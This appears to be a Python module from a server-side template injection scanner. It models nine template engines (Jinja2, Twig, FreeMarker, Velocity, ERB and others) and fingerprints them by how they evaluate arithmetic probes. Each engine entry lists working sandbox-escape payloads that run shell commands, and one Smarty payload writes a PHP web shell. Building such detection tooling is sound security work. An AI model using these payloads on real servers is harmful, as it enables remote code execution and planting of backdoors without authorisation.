"""Template-engine models.

Each engine is described by the syntax it accepts and the arithmetic it performs.
Fingerprinting works by sending the *same* arithmetic expression in every engine's
dialect and reading back the result — different engines disagree about operator
precedence and about how they render numbers, which is what makes them separable.

Pure data plus pure functions. No network here; that lives in probe.py.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Mapping


@dataclass(frozen=True)
class Engine:
    """One template engine's dialect and evaluation semantics."""

    key: str
    label: str
    # Arithmetic expression that evaluates to 49 in this dialect.
    # Most engines accept 7*7 directly, but the point is the *wrapper* syntax.
    expr: str
    # How a boolean True renders. Engines differ wildly here, and that is a
    # reliable secondary signal when arithmetic is filtered.
    true_render: tuple[str, ...]
    # Strings that appear in an error when this engine rejects an expression.
    error_markers: tuple[str, ...] = ()
    notes: str = ""
    sandbox_escapes: tuple[str, ...] = field(default_factory=tuple)
    # What THIS engine renders for each probe expression. Absent key = the
    # expression is not valid in this language, so the probe cannot confirm the
    # engine and is skipped for it. This is what makes identification possible:
    # without per-language answers, every {{ }} engine "confirms" every other.
    semantics: Mapping[str, str] = field(default_factory=dict)

    def render(self, payload: str) -> str:
        """Wrap a raw expression in this engine's delimiters."""
        return self.expr.replace("EXPR", payload)


# The order matters: the most specific dialect is tried first, because a few
# engines will happily evaluate a superset of another's syntax (Twig and Jinja2
# share the {{ }} form, so arithmetic semantics are what separate them).
ENGINES: tuple[Engine, ...] = (
    Engine(
        key="jinja2",
        label="Jinja2",
        expr="{{ EXPR }}",
        true_render=("True", "true"),
        error_markers=("jinja2.exceptions", "UndefinedError", "TemplateSyntaxError"),
        notes="Python semantics. Integer division floors and returns an int.",
        sandbox_escapes=(
            "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
            "{{ lipsum.__globals__['os'].popen('id').read() }}",
            "{{ self._TemplateReference__context.cycler.__init__.__globals__ }}",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "7*'7'": "7777777", "'7'*7": "7777777",
            "7.0*7": "49.0", "5/2": "2.5", "2**5": "32",
            # '~' is not an operator in Jinja2 -- the probe simply fails to render.
        },
    ),
    Engine(
        key="twig",
        label="Twig",
        expr="{{ EXPR }}",
        true_render=("1", "true"),
        error_markers=("Twig\\Error", "Twig_Error", "Unknown \"", "Unexpected token"),
        notes="PHP semantics. `~` concatenates, `and/or` are words, floats print short.",
        sandbox_escapes=(
            "{{ ['id']|filter('system') }}",
            "{{ _self.env.registerUndefinedFilterCallback('system') }}",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            # PHP coerces the numeric string, so this is 49 not 7777777.
            "7*'7'": "49", "'7'*7": "49",
            "7.0*7": "49.0", "5/2": "2.5",
            # '**' is not exponentiation in Twig; '~' is concatenation.
            "'a'~'b'": "ab",
        },
    ),
    Engine(
        key="freemarker",
        label="FreeMarker",
        expr="${EXPR}",
        true_render=("true", "yes"),
        error_markers=("freemarker.core", "FreeMarker template error", "Expected a number"),
        notes="Java semantics. `?c` forces a computer-format number, `?string` formats.",
        sandbox_escapes=(
            "${''?new()?api?class.protectionDomain}",
            '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            # Strict Java arithmetic: no string repetition, integer division.
            "5/2": "2", "7.0*7": "49",
        },
    ),
    Engine(
        key="velocity",
        label="Velocity",
        expr="#set($x=EXPR)$x",
        true_render=("true", "True"),
        error_markers=("org.apache.velocity", "VelocityException", "ParseErrorException"),
        notes="Java. Requires #set for arithmetic; bare expressions render literally.",
        sandbox_escapes=(
            "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))",
            "#set($e=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "5/2": "2", "7.0*7": "49",
        },
    ),
    Engine(
        key="erb",
        label="ERB",
        expr="<%= EXPR %>",
        true_render=("true", "True"),
        error_markers=("ActionView::Template::Error", "ERB", "NameError"),
        notes="Ruby. `**` is power, `/` on integers floors.",
        sandbox_escapes=(
            "<%= `id` %>",
            "<%= system('id') %>",
            "<%= IO.popen('id').read %>",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "7*'7'": "7777777", "'7'*7": "7777777",
            "7.0*7": "49.0",
            # Ruby Integer#/ floors, so 5/2 is 2, unlike Python's 2.5.
            "5/2": "2", "2**5": "32",
        },
    ),
    Engine(
        key="smarty",
        label="Smarty",
        expr="{EXPR}",
        true_render=("1", "true"),
        error_markers=("Smarty error", "SmartyCompilerException", "Syntax error in template"),
        notes="PHP. Bare `{...}` is ambiguous with CSS, so `{math}` is the safe form.",
        sandbox_escapes=(
            "{php}system('id');{/php}",
            "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['c']); ?>\",self::clearConfig())}",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "7*'7'": "49", "'7'*7": "49",
            "7.0*7": "49", "5/2": "2.5",
        },
    ),
    Engine(
        key="handlebars",
        label="Handlebars",
        expr="{{EXPR}}",
        true_render=("true",),
        error_markers=("Handlebars", "Parse error", "Missing helper"),
        notes="JS. Cannot do arithmetic natively — helper injection is the real risk.",
        sandbox_escapes=(
            "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}",
            "{{lookup (lookup this \"constructor\") \"constructor\"}}",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
        },
    ),
    Engine(
        key="nunjucks",
        label="Nunjucks",
        expr="{{ EXPR }}",
        true_render=("true", "True"),
        error_markers=("Template render error", "nunjucks", "expected"),
        notes="JS, Jinja-like syntax. `//` is integer division, unlike Python's `/`.",
        sandbox_escapes=(
            "{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")() }}",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "7*'7'": "49", "'7'*7": "49",
            "7.0*7": "49", "5/2": "2.5", "2**5": "32",
        },
    ),
    Engine(
        key="pug",
        label="Pug",
        expr="#{EXPR}",
        true_render=("true", "True"),
        error_markers=("Pug", "unexpected token", "is not a function"),
        notes="JS. `#{}` interpolates and escapes; `!{}` does not.",
        sandbox_escapes=(
            "- var x = process.mainModule.require('child_process').execSync('id')",
        ),
        semantics={
            "7*7": "49", "8*8": "64",
            "7*'7'": "49", "'7'*7": "49",
            "7.0*7": "49", "5/2": "2.5", "2**5": "32",
        },
    ),
)

BY_KEY = {e.key: e for e in ENGINES}

# Arithmetic probes. Each is chosen so the correct answer differs from the answer
# a naive string-substitution engine would produce, which is how we separate
# "evaluated" from "reflected".
#
# The `discriminator` flag marks probes whose *result depends on the engine's
# language*, not just on whether templating happened. Those are what let sift say
# "this is Jinja2" rather than "something here is a template engine".
#
# (expression, expected value as string, human note, discriminator)
# NOTE: no expected value here. Each engine declares what IT renders (see
# Engine.semantics), because the same expression means different things in
# different languages -- that disagreement is the fingerprint.
#
# (expression, human note, discriminator)
ARITHMETIC_PROBES: tuple[tuple[str, str, bool], ...] = (
    ("7*7", "baseline multiplication", False),
    ("8*8", "baseline multiplication", False),
    ("7*'7'", "string repetition: 7777777 in Python/Ruby, 49 elsewhere", True),
    ("'7'*7", "string repetition, reversed operand order", True),
    ("7.0*7", "float rendering: 49.0 (Python/Java) vs 49 (PHP 5/JS)", True),
    ("5/2", "division: 2.5 (Python/PHP/JS) vs 2 (Java/Ruby integer division)", True),
    ("2**5", "power operator: valid in Python/Ruby/JS, invalid in Twig", True),
    ("'a'~'b'", "Twig concatenation operator", True),
)


@dataclass(frozen=True)
class Fingerprint:
    """The result of comparing one engine's expected output to what came back."""

    engine: str
    matched: bool
    observed: str
    expected: str
    reason: str = ""


def expected_render(engine: Engine, payload: str, true_literal: str = "True") -> str:
    """
    The literal string we expect a working engine to produce.

    Several engines are arithmetic-only; for those we simply expect the number.
    """
    return payload


def _strip_echo(response_body: str, payload: str) -> str:
    """
    Remove the echoed payload from the body.

    This is the difference between a detector and a grep. A target that reflects
    our input returns `#set($x=5/2)$x`, which *contains* the expected marker "2";
    a naive substring test calls that an evaluation. Removing the echo first means
    the marker must appear somewhere the payload itself did not put it.
    """
    for variant in {
        payload,
        payload.replace(" ", ""),
    }:
        if variant:
            response_body = response_body.replace(variant, "")
    return response_body


def classify(
    engine: Engine,
    response_body: str,
    marker: str = "49",
    payload: str | None = None,
) -> Fingerprint:
    """
    Decide whether `response_body` shows evidence that `engine` evaluated `marker`.

    A reflected template returns the literal `{{ 7*7 }}`. An evaluated one returns
    `49`. We look for the marker outside any echoed copy of the payload, because
    many pages echo the input back inside the page or an error message.
    """
    body = _strip_echo(response_body, payload) if payload else response_body
    delimiters = ("{{", "}}", "${", "<%", "#{")
    has_raw = any(d in body for d in delimiters)
    has_value = marker in body

    if has_value and not has_raw:
        return Fingerprint(engine.key, True, response_body[:200], marker, "evaluated")
    if has_value and has_raw:
        # Both present: usually an error page quoting the input. Not proof.
        return Fingerprint(
            engine.key, False, response_body[:200], marker,
            "value present but the raw template was also echoed",
        )
    return Fingerprint(
        engine.key, False, response_body[:200], marker,
        "marker absent once the echoed payload was removed",
    )


def rank_engines(fingerprints: list[Fingerprint]) -> list[tuple[str, int]]:
    """
    Score engines by how many independent signals agreed.

    Returns [(engine_key, score)] sorted by score desc then key for stability.
    """
    scores: dict[str, int] = {}
    for fp in fingerprints:
        if fp.matched:
            scores[fp.engine] = scores.get(fp.engine, 0) + 1
    return sorted(scores.items(), key=lambda kv: (-kv[1], kv[0]))
